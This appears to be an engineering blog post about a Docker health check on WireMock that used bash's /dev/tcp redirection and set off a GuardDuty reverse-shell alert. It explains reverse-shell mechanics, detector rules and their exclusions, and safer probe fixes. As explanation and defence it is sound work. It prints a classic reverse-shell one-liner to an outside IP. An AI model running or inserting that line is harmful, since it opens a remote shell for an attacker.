+++
title = "The Health Check Was a Reverse Shell"
date = "2026-11-07"
description = "GuardDuty raised a High-severity reverse shell finding on a GitHub Actions runner running hermetic system tests. The process it saw was a Docker health check: bash, with a standard stream attached to /dev/tcp/127.0.0.1/8080, asking a WireMock container whether it had finished starting. The detector was right. A readiness probe and an intrusion do the same thing to the operating system, and the only thing that separates them is an intent that never appears on the wire."
tags = ["Testing", "Security", "Architecture", "Risk"]
+++

The finding arrived at High severity, with a sentence nobody wants attached to
a machine they are responsible for: *a process in a container or an Amazon EC2
instance has created a reverse shell*. The machine was a GitHub Actions runner.
It had spent the previous four minutes running system tests that I describe, in
the build documentation, as hermetic.

The first questions are always the same. What else was that runner doing? Did
anything leave the network that should not have? Who else has to be told?
Nothing was compromised, but establishing that took longer than it should have,
because Amazon GuardDuty was not guessing. It had watched a process do exactly
what it said, and the process details in the finding pointed at something I had
put there myself.

It was a Docker health check on a WireMock container:

```text
CMD ["bash", "-c", "< /dev/tcp/127.0.0.1/8080"]
```

It asks one question: is anything accepting connections on 8080 yet. If the
connection opens, bash exits 0, Docker marks the container healthy, and a few
hundred tests start running against a mock carrier API.

And this is the line every reverse-shell detection rule in the industry is
written against:

```text
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

One of those is test infrastructure. The other is somebody else's shell on your
host. They are the same construct with a different destination, and getting
from a flaky test to the first one took a chain of decisions that were each
reasonable on their own.

## How a health check became a reverse shell

It started with flaky tests. A container that Docker reports as running is not
a container that is serving, and Testcontainers, which starts the environment,
knows it. Its default wait checks that a port is listening, from outside and
from inside the container. But listening is not ready. A JVM that binds its
port and then spends another second loading stub mappings passes the check
before it can answer anything. The port answers. The application does not.

That never happens on a laptop. It happens on a runner with a dozen containers
competing for eight cores, in one run out of twenty, as a connection reset that
names nothing. A suite that fails that way does not get debugged. It gets
retried, and then it gets distrusted, so I went looking for a better readiness
signal.

My environment is a Docker Compose file, brought up through Testcontainers'
Compose module, and that decided where the signal had to live. Testcontainers
waits only on the services exposed to the test. Everything else, and every
ordering between services, belongs to Compose, and Compose has exactly one way
to say that a service must wait for another to be ready: `depends_on` with
`condition: service_healthy`, where healthy means the service's `healthcheck`
has passed. So every service that something depended on needed a health check,
and a health check runs inside the container.

Inside the container is where the trouble starts, because a health check can
only use what the image ships, and modern images ship almost nothing. Strip the
package manager, curl and wget, and most of a container's published CVE surface
goes with them; the standard advice is not to add them back for the sake of a
probe. The image has no HTTP client because an HTTP client is a liability, and
the probe needs one. What survives, in an image that still has bash, is bash's
own network redirection, the last network client in the building.

The health check that reached for it was generated, not typed, and the easy
version of that part of the story is wrong. `bash -c '< /dev/tcp/host/port'` is
the textbook workaround for a container with no curl. It is on Stack Overflow
and in production Dockerfiles at companies with real security teams, and an
engineer who knows bash well reaches for the same line: one process, no new
dependency, the shortest thing that answers the question.

It came to me in review. I approved it.

What the generator lacked was not knowledge of bash. It was a model of the
sensor watching the host, and I did not have one either. The cost of that line
was invisible at the point of use, in review and in CI. It became visible three
weeks later, in a security console owned by somebody else.

## The detector was right

It is tempting to read a finding like this as a false positive. It is not. The
rule does not pattern-match command lines. It watches for one behaviour: a
process wiring one of its own standard streams (input, output, or error) to a
network connection instead of a terminal. Aqua's Tracee publishes its version
as TRC-101, and Google's Security Command Center and Sysdig's threat research
describe the same shape. My health check satisfies every clause of it. The
redirection is not decoration around a connection; it *is* the connection. Bash
opens a TCP socket and hands it to the shell as its standard input.

The attack line does the same thing and goes further. `/dev/tcp/host/port` is
not a device file but bash's own parser opening the connection, so the shell
becomes its own network client. `>&` points output and errors at that
connection, `0>&1` points input at the same place, and `-i` asks for an
interactive shell. The sum is a shell whose every stream is a line to somebody
else's machine. My probe was that, with two of the three streams left off.

The word *reverse* is what makes it dangerous. A normal remote shell is the
attacker connecting in to a port the target listens on. A reverse shell is the
target connecting out, and that inversion is the whole tactic. Firewalls,
security groups and NAT filter inbound connections by default, while outbound
traffic from an established host looks like an ordinary client and usually is
not filtered at all. There is no port to close on the victim, because the
victim is the one placing the call. In ATT&CK this is T1059.004, the step after
the break-in, where one command an attacker managed to run becomes an
interactive session.

Attackers use `/dev/tcp` rather than `nc` or a Python one-liner for the same
reason my probe did. Those have to be installed, a hardened image strips them,
and bash, with its TCP client compiled in, is often what remains. The
tradecraft term is living off the land: use what is already present, install
nothing, write nothing to disk. The intruder and the generated probe arrive at
the same line from the same scarcity, pointed at different hosts.

GuardDuty says it raises the finding only when the surrounding activity looks
suspicious, and that did not help here either. A short-lived bash inside a
container, attaching a socket to a standard stream and dying immediately,
several times a minute, is not a reassuring shape. It is a stealthier shape
than the real thing.

You asked for a smaller attack surface. You got a probe that looks like an
attack.

## Looking for a way to make it stop

The obvious move is to make the alarm quieter, and the industry has been down
that road. Falco's rule ships as *Redirect STDOUT/STDIN to Network Connection
in Container*; it was submitted as "Reverse shell", and review asked for a name
that described the behaviour instead, because not everything that does this is
a reverse shell. Elastic's prebuilt rule ships with carve-outs: processes whose
parent is `timeout` or `runc init`, executables under Docker's overlay
directories, loopback destinations.

Each carve-out reconstructs intent from circumstance. Parent is `runc init`,
therefore container startup, therefore probably a health check. It works, and
it is guessing about the one thing that separates probe from attack: where the
connection points. A signature cannot be written on that, because a probe to a
loopback port and a beacon to a loopback port are also the same line. The
exclusions are also a map of how to look innocent, published by the defender.

GuardDuty's version is the suppression rule, which can be narrowed to an
executable path, a hash or a container image. It does not change what is
detected. The finding is still generated and archived on arrival, archived
findings stop feeding GuardDuty's attack-sequence correlation, and the
executable is bash either way. Suppressing it would have meant teaching the
detector to look away from bash in containers.

The fix had to be at the probe. The probe is the part I own.

## Readiness without a shell holding a socket

Before changing anything, I read what Testcontainers' default wait actually
runs. From outside, it polls the mapped port from the test JVM. From inside, it
runs a small shell loop that tries three ways to prove the port is listening:
`grep` for the port in `/proc/net/tcp`, then `nc -vz localhost <port>`, and as
a last resort `/bin/bash -c '</dev/tcp/localhost/<port>'`. The same
redirection, sitting in the default of the most widely used Java test library.
My probe had not been an eccentric choice. It had been the conventional one.

The first fix is to undo the move for anything the test itself waits on.
WireMock 3 serves `/__admin/health`, and the Compose module takes a wait
strategy per exposed service:

```java
new ComposeContainer(new File("compose.yaml"))
    .withExposedService("wiremock", 8080,
        Wait.forHttp("/__admin/health").forStatusCode(200));
```

No shell runs and no `HEALTHCHECK` is involved. The test JVM makes an ordinary
HTTP request, and it proves more than the redirection did: a server parsed a
request and answered it. For one service waiting on another inside Compose, the
better answer is one the application should give anyway. A service that retries
its dependencies at startup needs no ordering at all.

Kafka native was the harder case. The image is Alpine with `bash` added on
purpose, which is why `/dev/tcp` was reachable at all, on top of BusyBox, so
`grep` is present and curl is not. Curl would not have helped anyway, because
the broker speaks Kafka's binary protocol, not HTTP. The only question is
whether something is listening on 9092, and the kernel already publishes the
answer as a file:

```text
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt
   0: 00000000:2384 00000000:0000 0A 00000000:00000000 00:00000000 00000000
```

`/proc/net/tcp` lists every TCP socket in the container's network namespace,
with a column that says whether it is listening. The port is in hexadecimal,
but the whole check is a `grep`, and in Compose it does not even need a shell:

```yaml
healthcheck:
  test: ["CMD", "grep", "-q", ":2384 0*:0000 0A", "/proc/net/tcp", "/proc/net/tcp6"]
```

This is the probe to reach for first, because the dangerous part is gone.
Reading a file is not opening a socket. Every Linux container has `/proc`
whatever else was stripped, so the check needs nothing that connects anywhere.
It is what the attacker liked about `/dev/tcp`, flipped to the defender's side:
it works almost everywhere because it asks the kernel a question the kernel
already answers for free.

If your image has no shell at all, stay outside: an HTTP or log-message wait
needs nothing from the image. `Wait.forSuccessfulCommand` will not help there,
because it runs through `/bin/sh -c`. The inside option left is a small static
binary, mounted as a volume and named in an exec-form `healthcheck`, which is
plumbing an outside wait never needs.

## Making it stay fixed

Fixing the two probes was the easy part. Keeping them fixed needed two more
changes, because the line had been correct by every standard the codebase knew
about.

A check now runs before the suite, over the compose files and Dockerfiles in
the topology. It fails the build if a health check invokes a shell where an
exec-form binary would do, and if any shell command in the topology redirects
into bash's network paths. It refuses the class, not the known-bad line, so it
survives the same trick spelled with `/dev/udp` or `exec 3<>`.

The second change is in `AGENTS.md`. The generator will be asked the same
question again, and it will reach for the same idiom, because the idiom is
correct and nothing in its instructions said otherwise. Now the instructions
say otherwise, with the reason attached: readiness probes read kernel state or
use a real client, never a shell redirection, because a shell holding a socket
is the signature of a compromise and a CI runner is a monitored host.

A gate catches the line. The instruction prevents it. The gate exists because
instructions are advice and a build failure is not.

Neither of them belongs in every repository that runs a Compose file, and that
is the part still open. A test container has no reason to dial out at all; it
answers the harness and nothing else. A test system that owns the topology
could make that the default, along with the probe rules, so that no environment
has to rediscover them.

## What the alarm was actually telling me

I have written that [a mechanism exists because some force made the
straightforward design
insufficient](/articles/architecture-must-follow-force/), and that [the
interesting question is who pays](/articles/who-pays-for-the-force/) once it
does. Every mechanism in this story was justified. Compose needed a health
check to order its services. Minimal images removed the HTTP client. The probe
used what was left. Runtime detection of a standard stream on a socket is the
correct rule, written correctly.

The bill went to a security team that had never read my Dockerfiles, for a
decision made inside a test harness they did not know existed.

Nothing was compromised.

Nothing was wrong with the alarm either.

## References

**The detection**

1. Amazon Web Services, *GuardDuty Runtime Monitoring finding types* —
   `Execution:Runtime/ReverseShell`, default severity High.
   https://docs.aws.amazon.com/guardduty/latest/ug/findings-runtime-monitoring.html

2. Aqua Security, Tracee signature TRC-101, *Process Standard Input/Output Over
   Socket Detected*. Evaluates descriptors 0, 1 and 2 on
   `security_socket_connect` and `socket_dup`, internet address families only.
   https://avd.aquasec.com/tracee/execution/trc101

3. Google Cloud, Security Command Center threat finding *Reverse Shell* — a
   process started with stream redirection to a remote connected socket.
   https://docs.cloud.google.com/security-command-center/docs/findings/threats/reverse-shell

4. Sysdig Threat Research, *Hunting reverse shells: how the Sysdig Threat
   Research Team builds smarter detection rules* — the `socket`, `connect`,
   `dup2` sequence and what it costs to match it.
   https://www.sysdig.com/blog/hunting-reverse-shells-how-the-sysdig-threat-research-team-builds-smarter-detection-rules

5. Elastic Security, prebuilt rule *Potential Reverse Shell Activity via
   Terminal* — the exclusions for `timeout` parents, `/var/lib/docker/overlay*`
   executables, `runc init` lineage and loopback destinations.
   https://www.elastic.co/guide/en/security/8.19/prebuilt-rule-8-19-20-potential-reverse-shell-activity-via-terminal.html

6. MITRE ATT&CK T1059.004, *Command and Scripting Interpreter: Unix Shell*.
   https://attack.mitre.org/techniques/T1059/004/

7. falcosecurity/falco pull request 1152 — the rule that became *Redirect
   STDOUT/STDIN to Network Connection in Container*, first submitted as
   "Reverse shell" and renamed in review to describe the behaviour.
   https://github.com/falcosecurity/falco/pull/1152

8. Falco, *Rules Overview* — the default ruleset, including the redirect rule.
   https://falcosecurity.github.io/rules

9. Amazon Web Services, *Suppression rules in GuardDuty* — filters that
   auto-archive matching findings, scoping by executable path, executable
   SHA-256 or container image, and the effect of broad rules on Extended
   Threat Detection.
   https://docs.aws.amazon.com/guardduty/latest/ug/findings_suppression-rule.html

**The probe**

10. Docker, `HEALTHCHECK` reference — the check runs inside the container.
    https://docs.docker.com/reference/dockerfile/#healthcheck

11. GNU Bash manual, *Redirections* — `/dev/tcp/host/port` and `/dev/udp/host/port`
    are interpreted by the shell itself, available only when bash is compiled with
    network redirection support.
    https://www.gnu.org/software/bash/manual/bash.html#Redirections

12. `proc(5)`, `/proc/net/tcp` — hexadecimal local address and port, and the `st`
    column carrying `0A` for `TCP_LISTEN`.
    https://man7.org/linux/man-pages/man5/proc_net.5.html

13. University of Cambridge, *How to write a HEALTHCHECK for a distroless image*
    — including the advice not to add curl, wget or bash back for the sake of a
    probe.
    https://guidebook.devops.uis.cam.ac.uk/howtos/containers/write-a-healthcheck-for-a-distroless-image/

14. Testcontainers, *Waiting for containers to start or be ready* — the default
    strategy waits up to 60 seconds for the first mapped port to listen, and
    `Wait.forHttp`, `Wait.forLogMessage` and `Wait.forHealthcheck` are the
    alternatives.
    https://java.testcontainers.org/features/startup_and_waits/

15. testcontainers-java, `HostPortWaitStrategy` — the default wait, running an
    external check against the mapped host port and an internal check inside
    the container concurrently.
    https://github.com/testcontainers/testcontainers-java/blob/main/core/src/main/java/org/testcontainers/containers/wait/strategy/HostPortWaitStrategy.java

16. testcontainers-java, `InternalCommandPortListeningCheck` — the internal
    check: a `/bin/sh -c` loop trying `grep` over `/proc/net/tcp*`, then `nc`,
    then `/bin/bash -c '</dev/tcp/localhost/<port>'`.
    https://github.com/testcontainers/testcontainers-java/blob/main/core/src/main/java/org/testcontainers/containers/wait/internal/InternalCommandPortListeningCheck.java

17. Testcontainers, *Docker Compose module* — wait strategies attach per exposed
    service through `withExposedService`, and an ambassador container proxies
    exposed ports from the Compose network to the test.
    https://java.testcontainers.org/modules/docker_compose/

18. testcontainers-java, `ShellStrategy` — the strategy behind
    `Wait.forSuccessfulCommand`, which runs its command with `/bin/sh -c`.
    https://github.com/testcontainers/testcontainers-java/blob/main/core/src/main/java/org/testcontainers/containers/wait/strategy/ShellStrategy.java

19. Docker, *Control startup order in Compose* — `depends_on` conditions, and
    `service_healthy` defined by the service's `healthcheck`.
    https://docs.docker.com/compose/how-tos/startup-order/

20. WireMock, Admin API reference — `/__admin/health` on 3.x.
    https://wiremock.org/docs/standalone/admin-api-reference/

**Earlier articles**

21. Fabio Ellena, "Architecture Must Follow Force," 2026.
    https://fblln.github.io/articles/architecture-must-follow-force/

22. Fabio Ellena, "Who Pays for the Force," 2026.
    https://fblln.github.io/articles/who-pays-for-the-force/